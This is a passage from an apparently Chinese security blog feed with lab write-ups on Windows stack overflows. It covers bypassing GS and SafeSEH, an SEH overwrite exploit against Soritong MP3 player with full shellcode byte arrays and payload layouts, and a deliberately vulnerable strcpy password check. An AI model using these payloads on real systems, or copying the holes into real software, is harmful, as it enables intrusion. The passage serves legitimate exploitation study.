class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="string">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x68\x10\x12\x11"</span><span class="comment">//address of pop pop retn in No_SafeSEH module</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\xE9\x1F\xFF\xFF\xFF"</span></span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="string">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"</span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">MyException</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"There is an exception"</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">char</span>* input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> str[<span class="number">200</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(str, input);</span><br><span class="line"><span class="keyword">int</span> zero = <span class="number">0</span>;</span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line">zero = <span class="number">1</span> / zero;</span><br><span class="line">&#125;</span><br><span class="line">__except (MyException())</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HINSTANCE hInst = LoadLibrary(_T(<span class="string">"SEH_NOSafeSEH_JUMP.dll"</span>));<span class="comment">//load No_SafeSEH module</span></span><br><span class="line"><span class="keyword">char</span> str[<span class="number">200</span>];</span><br><span class="line">test(shellcode);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实验代码解释</p><ul><li><ol><li>第一段代码是DLL使用vc6.0编译，同时设置基地址未0x11120000。工程–》设置–》切换到连接选项卡–》输入框中添加/base:”0x11120000”</li></ol></li><li><ol start="2"><li>第二段代码对应调用的DLL，存在漏洞的代码。启用GS,启用SafeSEH,禁用优化，禁用DEP。test函数中明显存在一个栈溢出漏洞，最后利用除零来触发异常。但是我实际按照书上的代码操作的时候，因为shellcode太长，复制的时候向0x00130000进行复制，先触发了访问异常。所以和书上的情况有些不同，进行了适当的调整，将shellcode反正了前面。</li></ol></li></ul><p>实验过程</p><ul><li>1.用OD加载SHE_NOSafe.exe并运行</li><li>2.利用OllySSEH插件（百度云中也放了）进行扫描，查看程序和DLL是否使用了SafeSEH。/SafeSEH OFF表示未启用SafeSEH，这种就可以做为跳板。/SafeSEH ON启用了SafeSEH，右键可以查看SEH表的注册情况。No SEH不支持SafeSEH，即IMAGE_DLLCHARACTERISTICS_NO_SEH标志位被设置，模块内的异常会被忽略，不能做为跳板。Error 读取错误。如下图所示。</li><li>3.查找SEH_NoSafeSEH_JUMP.dll中pop pop retn的地址。可以使用OllyFindAddr插件–》OverFlow return address–》Find POP RETN–》Count of pop填2。可以查找全范围内的所有pop pop retn的地址，这里使用0x11121068做为我们的跳板</li></ul><p><img src="/2019/05/15/绕过GS和SafeSEH保护/SafeSEHScan.png" alt="SafeSEHSacn"></p><p><img src="/2019/05/15/绕过GS和SafeSEH保护/poppopretn.png" alt="poppopretn"></p><ul><li>4.确定Shellcode位置。因为0x00130000地址不能读写，只能将shellcode安排在前面。再用跳转指令回到shellcode。shellcode布局：[32个字节0x90][168个字节shellcode][16字节0x90][4字节 pop pop retn地址][5字节jmp指令][168字节填充]。具体流程如下所示。在触发异常后，利用没有启用SafeSEH的模块中的pop pop retn指令使EIP指向SEH_handler+4的地址，再用jmp指令跳转到shellcode之前，成功执行shellcode。</li></ul><p><img src="/2019/05/15/绕过GS和SafeSEH保护/SafeSEH绕过流程图.png" alt="SafeSEH绕过流程图"></p><h2 id="利用加载模块之外的地址绕过SafeSEH"><a href="#利用加载模块之外的地址绕过SafeSEH" class="headerlink" title="利用加载模块之外的地址绕过SafeSEH"></a>利用加载模块之外的地址绕过SafeSEH</h2><p>类似前面利用没有启用SafeSEH的模块来绕过，利用插件ollyFindAddr可以来找到可以利用地址。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次实验的大部分问题出在了编译程序上，还有就是没注意到书上GS的实验都是在windows2000上进行的，在windows xp sp3上并不能成功的绕过。在绕过GS和SafeSEH的时候遇到可用空间不住，可以用jmp指令来跳转到前面或后面空间中进行利用。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;在看了《0day安全》的&lt;strong&gt;栈中的守护天使：GS&lt;/strong&gt;和&lt;strong&gt;亡羊补牢：SafeSEH&lt;/strong&gt;，并将里面的实验做了一遍之后，总结一下遇到的坑和一些失败的经验。文章将从下面几点进行讲述：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;ol&gt;
&lt;li&gt;如何使用VS2019编译能在windows XP SP3上运行的程序。如何对程序和电脑进行GS，SafeSEH，DEP进行设置&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;GS的原理和绕过方法（实验失败）&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;SafeSEH的原理和绕过方法&lt;/li&gt;&lt;/ol&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="栈溢出" scheme="https://bigkan.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
      <category term="安全" scheme="https://bigkan.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="基础" scheme="https://bigkan.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>利用SEH的栈溢出</title>
    <link href="https://bigkan.github.io/2019/04/24/%E5%88%A9%E7%94%A8SEH%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <id>https://bigkan.github.io/2019/04/24/利用SEH的栈溢出/</id>
    <published>2019-04-23T16:00:00.000Z</published>
    <updated>2020-07-02T15:07:55.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>在看了《Exploit编写系列教程》的第三章和几篇SEH的博客后稍微记录一下。最后虽然整个分析的流程和教程的一模一样，但是用msf生成的payload并没有成功弹出计算器。我还是个新手小白所以虽然看了很久的教程但还是有一些不是很清楚。下面从下面三个部分记录一下</p><ul><li>1.SEH的概念和一些数据结构</li><li>2.利用SEH进行栈溢出的原理</li><li>3.《Exploit编写系列教程》中的案例分析<a id="more"></a></li></ul></blockquote><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul><li>运行环境：Windows XP Professional EN (SP0)</li><li>调试软件：ollydbg 2.0</li><li>python：2.7</li><li>有漏洞软件：Soritong MP3 player 1.0</li><li>所有代码，软件都在下面的百度云链接中</li></ul><h1 id="SEH概述"><a href="#SEH概述" class="headerlink" title="SEH概述"></a>SEH概述</h1><blockquote><p>SEH即异常处理结构体（Structure Exception Handler），是Windows异常处理机制的重要数据结构。下面只简单介绍几个必要的概念：</p></blockquote><ul><li>结构化异常处理是基于线程的。当线程初始化时会自动向栈中安装一个SEH作为线程默认的异常处理</li><li>在程序源码中使用<strong>try{}</strong>except{}或者Assert等异常处理机制，编译器将最终通过当前函数栈中安装一个SEH来实现异常处理</li><li>每个SEH包含一个_EXCEPTION_REGISTRATION结构体。结构体包含两个DWORD指针:SEH链表指针（Next SEH Recorder）和异常处理函数句柄（Exception Handler）</li><li>栈中一般会有多个SEH</li><li>栈中多个SEH通过链表的指针（Next SEH Recorder）在栈内由栈顶向栈底串成单向链表</li><li>TEB的0字节处（FS:[0]）指向最顶上的SEH。所以当异常发生时，系统首先从TEB的0字节处取得第一个SEH结构进行异常处理。当异常处理函数无法处理该异常时，会顺着SEH链寻找下一个异常处理函数来处理。如果都无法处理，最后一个SEH链表指针会指向0xFFFFFFFF表示是最后一个SEH，一般这时就会弹出一个我们常见的报错，然后程序退出。下图就是SEH调用链</li></ul><p><img src="/2019/04/24/利用SEH的栈溢出/SEH链.png" alt="SEH调用链"></p><h1 id="利用SEH进行栈溢出的原理"><a href="#利用SEH进行栈溢出的原理" class="headerlink" title="利用SEH进行栈溢出的原理"></a>利用SEH进行栈溢出的原理</h1><ul><li><ol><li>SEH放在栈内，可能会被溢出的数据把Next SEH Recorder和Exception Handler覆盖</li></ol></li><li><ol start="2"><li>将Exception Handler覆盖为ShellCode的入口地址</li></ol></li><li><ol start="3"><li>溢出数据触发异常，使系统调用SEH链进行异常处理</li></ol></li></ul><blockquote><p>下面实验中，将Next SEH Recorder覆盖为”\xeb\x06\x90\x90”（jmp 0x06 nop nop的机器码，向后跳转到ShellCode的入口地址），将Exception Handler覆盖为pop pop ret的地址，再将Exception Handler后面的内容覆盖为ShellCode内容。为什么要找pop pop ret来使用呢？下面是调用Exception Handler时的栈帧，下一个EXCEPTION_REGISTRATION结构在ESP+08的地方，执行了pop pop ret后正好把EXCEPTION_REGISTRATION的地址（就是前面的Next SEH Recorder的地址）送入到EIP中，程序跳转到执行jmp 0x06正好跳转到shellcode代码地址处执行。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">EBP-00 _ebp</span><br><span class="line">EBP-04 trylevel</span><br><span class="line">EBP-08 scopetable数组指针</span><br><span class="line">EBP-0C handler函数地址</span><br><span class="line">EBP-10指向下一个EXCEPTION_REGISTRATION结构</span><br><span class="line">EBP-14 GetExceptionInformation</span><br><span class="line">EBP-18 栈帧中的标准ESP</span><br></pre></td></tr></table></figure><h1 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h1><h2 id="找到溢出点"><a href="#找到溢出点" class="headerlink" title="找到溢出点"></a>找到溢出点</h2><blockquote><p>已经知道5000个A的UI.txt会触发Soritong MP3 player 1.0的SEH，表现就是程序闪退并没有出现默认的报错（当然这也不能判断一定覆盖到了SEH）。先用patter.py生成5000个字符，然后用ollydbg来调试该软件找到是哪几个覆盖了NSEH和Handler。如下图所示。NSEH被4At5成功覆盖，Handler被At6A覆盖。通过pattern.py可以知道4At5在584。现在也就已经得到exp的组成结构了:<strong>[‘A’*584][“\xeb\x06\x90\x90”][pop pop ret的地址][ShellCode][‘A’*1000触发溢出]</strong></p></blockquote><p><img src="/2019/04/24/利用SEH的栈溢出/findESH.png" alt="覆盖点"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(py2) C:\workplace\tools&gt;python pattern.py 4At5</span><br><span class="line">Pattern 4At5 first occurrence at position 584 in pattern.</span><br></pre></td></tr></table></figure></p><h2 id="找到pop-pop-ret"><a href="#找到pop-pop-ret" class="headerlink" title="找到pop pop ret"></a>找到pop pop ret</h2><blockquote><p>为了exp的稳定性一般选用软件自带的DLL来作为跳板，这次使用软件自带的player.dll。在ollydbg的player.dll的汇编代码区右键-&gt;search for-&gt;sequence of commands输入pop ESI pop EDI ret。找到地址为0x1009e812 (中间不能出现0x00)</p></blockquote><h2 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h2><blockquote><p>现在就剩最后一步了就是生成shellcode。但是这步我用msf没有生成的shellcode并没有成功弹出计算器，但是用他的shellcode却成功弹了计算器。下面是shellcode代码</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">buf = <span class="string">""</span></span><br><span class="line"><span class="comment"># success</span></span><br><span class="line">buf +=<span class="string">"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"</span></span><br><span class="line">buf +=<span class="string">"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"</span></span><br><span class="line">buf +=<span class="string">"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"</span></span><br><span class="line">buf +=<span class="string">"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"</span></span><br><span class="line">buf +=<span class="string">"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44"</span></span><br><span class="line">buf +=<span class="string">"\x42\x30\x42\x50\x42\x30\x4b\x38\x45\x54\x4e\x33\x4b\x58\x4e\x37"</span></span><br><span class="line">buf +=<span class="string">"\x45\x50\x4a\x47\x41\x30\x4f\x4e\x4b\x38\x4f\x44\x4a\x41\x4b\x48"</span></span><br><span class="line">buf +=<span class="string">"\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x34\x4b\x38\x46\x43\x4b\x48"</span></span><br><span class="line">buf +=<span class="string">"\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x39\x4e\x4a\x46\x48\x42\x4c"</span></span><br><span class="line">buf +=<span class="string">"\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e"</span></span><br><span class="line">buf +=<span class="string">"\x46\x4f\x4b\x43\x46\x35\x46\x42\x46\x30\x45\x47\x45\x4e\x4b\x48"</span></span><br><span class="line">buf +=<span class="string">"\x4f\x35\x46\x42\x41\x50\x4b\x4e\x48\x46\x4b\x58\x4e\x30\x4b\x54"</span></span><br><span class="line">buf +=<span class="string">"\x4b\x58\x4f\x55\x4e\x31\x41\x50\x4b\x4e\x4b\x58\x4e\x31\x4b\x48"</span></span><br><span class="line">buf +=<span class="string">"\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x30\x43\x4c\x41\x43"</span></span><br><span class="line">buf +=<span class="string">"\x42\x4c\x46\x46\x4b\x48\x42\x54\x42\x53\x45\x38\x42\x4c\x4a\x57"</span></span><br><span class="line">buf +=<span class="string">"\x4e\x30\x4b\x48\x42\x54\x4e\x30\x4b\x48\x42\x37\x4e\x51\x4d\x4a"</span></span><br><span class="line">buf +=<span class="string">"\x4b\x58\x4a\x56\x4a\x50\x4b\x4e\x49\x30\x4b\x38\x42\x38\x42\x4b"</span></span><br><span class="line">buf +=<span class="string">"\x42\x50\x42\x30\x42\x50\x4b\x58\x4a\x46\x4e\x43\x4f\x35\x41\x53"</span></span><br><span class="line">buf +=<span class="string">"\x48\x4f\x42\x56\x48\x45\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x37"</span></span><br><span class="line">buf +=<span class="string">"\x42\x35\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x4a\x46\x4a\x49"</span></span><br><span class="line">buf +=<span class="string">"\x50\x4f\x4c\x58\x50\x30\x47\x45\x4f\x4f\x47\x4e\x43\x36\x41\x46"</span></span><br><span class="line">buf +=<span class="string">"\x4e\x36\x43\x46\x42\x50\x5a"</span></span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote><p>总结就用那个公式就能解释在以前的windows系统上利用SEH的原理:<strong>[填充触发SEH][“\xeb\x06\x90\x90”][pop pop ret的地址][ShellCode][填充触发SEH]</strong></p></blockquote><ul><li><a href="https://blog.csdn.net/chenlycly/article/details/52575260" target="_blank" rel="noopener">SEH相关文章链接</a></li><li><a href="https://pan.baidu.com/s/1cFOWWJj1IaMHh67FBdbQgA" target="_blank" rel="noopener">配套资料百度云链接</a>     提取码：bxa1</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;在看了《Exploit编写系列教程》的第三章和几篇SEH的博客后稍微记录一下。最后虽然整个分析的流程和教程的一模一样，但是用msf生成的payload并没有成功弹出计算器。我还是个新手小白所以虽然看了很久的教程但还是有一些不是很清楚。下面从下面三个部分记录一下&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1.SEH的概念和一些数据结构&lt;/li&gt;
&lt;li&gt;2.利用SEH进行栈溢出的原理&lt;/li&gt;
&lt;li&gt;3.《Exploit编写系列教程》中的案例分析&lt;/li&gt;&lt;/ul&gt;&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="栈溢出" scheme="https://bigkan.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
      <category term="安全" scheme="https://bigkan.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="基础" scheme="https://bigkan.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>栈溢出原理及实验</title>
    <link href="https://bigkan.github.io/2019/04/15/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E9%AA%8C/"/>
    <id>https://bigkan.github.io/2019/04/15/栈溢出原理及实验/</id>
    <published>2019-04-14T16:42:07.000Z</published>
    <updated>2020-07-02T15:07:55.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>在看了《0day安全：软件漏洞分析技术》的前几章和《Exploit编写系列教程》的第一章之后，简单记录一下自己遇到的问题，一些资源和简单命令。下面主要从3个方面出发记录。1.栈溢出的原理及简单demo实验。2.具体软件栈溢出的利用（不是挖掘栈溢出漏洞，是已经知道后怎么利用）。3.Metasploit的简单使用。<br><a id="more"></a></p></blockquote><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><blockquote><p>系统版本，软件的编译选项等会对栈溢出是否生效产生影响。建议最好在虚拟机中进行实验</p><ul><li>栈溢出软件运行环境：吾爱破解论坛的虚拟机（WinXp sp3）</li><li>olldbg  x32_dbg</li><li>攻击机：Kali</li><li>python：2.7</li><li>所有代码，软件都在下面的百度云链接中<a href="https://pan.baidu.com/s/1K2pjScAM5x2OIGtnhA4cpw" target="_blank" rel="noopener">资料</a> 提取码：7inm </li></ul></blockquote><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><blockquote><p>栈是一种LIFO（后进先出）的数据结构。最常见两种操作：压栈（PUSH）,出栈（POP）。函数在调用时需要把用到的参数压入栈中，并且把EBP（栈基址）和EIP（函数调用返回后执行的下一条命令地址）也压入栈中。</p></blockquote><h2 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h2><blockquote><p>不同的声明对函数调用的处理有一些区别。</p></blockquote><table><thead><tr><th>调用约定的声明</th><th>参数入栈顺序</th><th>恢复栈平衡的位置</th></tr></thead><tbody><tr><td>__cdecl</td><td>右-&gt;左</td><td>母函数</td></tr><tr><td>__fastcall</td><td>右-&gt;左</td><td>子函数</td></tr><tr><td>__stdcall</td><td>右-&gt;左</td><td>子函数</td></tr></tbody></table><blockquote><p>函数调用的一般步骤</p><ol><li>参数入栈：参数从右到左依次压入系统栈中</li><li>返回地址入栈： 将当前指令的下一条代码地址压入栈中，供返回后使用</li><li>代码区跳转： 处理器从当前代码区跳转到被调用函数的入口处</li><li>栈帧调整：保存当前栈帧状态值，以备后面恢复栈帧使用（EBP入栈）；将当前栈帧切换到新栈帧（将ESP值装入EBP，更新栈帧底部）；给新栈帧分配空间（把ESP减去所需空间的大小，抬高栈顶）；<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">;func_add(int a,int b)</span></span><br><span class="line"><span class="keyword">push</span> b<span class="comment">;b入栈</span></span><br><span class="line"><span class="keyword">push</span> a<span class="comment">;a入栈</span></span><br><span class="line"><span class="keyword">call</span> func_add<span class="comment">;调用add做了两件事情1.将下一条命令地址压入栈中2.跳转到函数入口</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ebp</span><span class="comment">;保存上一个栈的底部</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span><span class="comment">;设置新栈的底部</span></span><br><span class="line"><span class="keyword">sub</span> <span class="built_in">esp</span>,xxx<span class="comment">;设置栈帧的顶部，抬高栈空间</span></span><br></pre></td></tr></table></figure></li></ol></blockquote><p>下图为main调用func_add时栈的状态示意图<br><img src="/2019/04/15/栈溢出原理及实验/函数调用原理.png" alt="函数调用原理"></p><h1 id="栈溢出简单Demo"><a href="#栈溢出简单Demo" class="headerlink" title="栈溢出简单Demo"></a>栈溢出简单Demo</h1><p>实验环境</p><table><thead><tr><th></th><th>推荐使用的环境</th><th>备注</th></tr></thead><tbody><tr><td>操作系统</td><td>win32Xp SP2</td><td>我是在WinXp sp3进行实验的</td></tr><tr><td>编译器</td><td>VC6.0</td><td>其他编译器需要重新调试</td></tr><tr><td>编译选项</td><td>默认编译选项</td><td>VS2003和VS2005中的GS编译选项会使栈溢出失败</td></tr><tr><td>build版本</td><td>debug</td><td>使用release版本需要重新调试</td></tr></tbody></table><p>实验代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stack_overflow_var.exe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PASSWORD <span class="meta-string">"1234567"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">verify_password</span> <span class="params">(<span class="keyword">char</span> *password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> authenticated;</span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">8</span>];<span class="comment">// add local buff</span></span><br><span class="line">authenticated=<span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line"><span class="built_in">strcpy</span>(buffer,password);<span class="comment">//over flowed here!</span></span><br><span class="line"><span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> valid_flag=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> password[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"please input password:       "</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>,password);</span><br><span class="line"></span><br><span class="line">valid_flag = verify_password(password);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(valid_flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"incorrect password!\n\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Congratulation! You have passed the verification!\n"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>可以看到输入password时并没有限制长度，但是在verify_password中复制password到buff时，buff只有8个字节的长度，可能会产生溢出。下图是当我们输入7个q时栈的状态。</p></blockquote><p><img src="/2019/04/15/栈溢出原理及实验/栈帧布局.jpg" alt="栈帧布局"></p><blockquote><p>c/c++判断字符串结尾是根据null来判断的，当遇到null时就是字符串结尾。Null在代码中表示为0x00。当我们输入8个q时，最后的null会溢出将0x00000001覆盖为0x00000000即authenticated返回为false，程序就会返回“Congratulation! You have passed the verification!”表示password相等的提示。这就完成了简单的溢出。当然如果我们输入的password足够长，可将返回地址也给覆盖掉，转而执行其他函数。下图为ollydbg调试执行了strcpy之后的栈。</p></blockquote><p><img src="/2019/04/15/栈溢出原理及实验/输入8个q之后的栈.png" alt="输入8个q之后的栈"></p><h1 id="具体软件栈溢出的利用"><a href="#具体软件栈溢出的利用" class="headerlink" title="具体软件栈溢出的利用"></a>具体软件栈溢出的利用</h1><blockquote><p>这个漏洞最早被发在packetstormsecurity.org中,<a href="https://packetstormsecurity.com/files/79307/Easy-RM-To-MP3-Converter-2.7.3.700-Overflow.html" target="_blank" rel="noopener">原文链接</a>。为了进行实验我去网上找到了这个<a href="https://www.exploit-db.com/exploits/10374" target="_blank" rel="noopener">软件和POC</a>。如果访问不了这几个网站的话，在文章的开头的百度云链接中也有这个软件。因为是第一次做这个实验所以也遇到挺多坑的，给的POC也并不能运行。所以我的目标就是根据文章利用MSF写出POC。</p></blockquote><h2 id="定位到溢出点"><a href="#定位到溢出点" class="headerlink" title="定位到溢出点"></a>定位到溢出点</h2><blockquote><p>根据文章我们知道crash.m3u文件的25000到30000之间的某个位置。所以就用 <strong>pattern.py 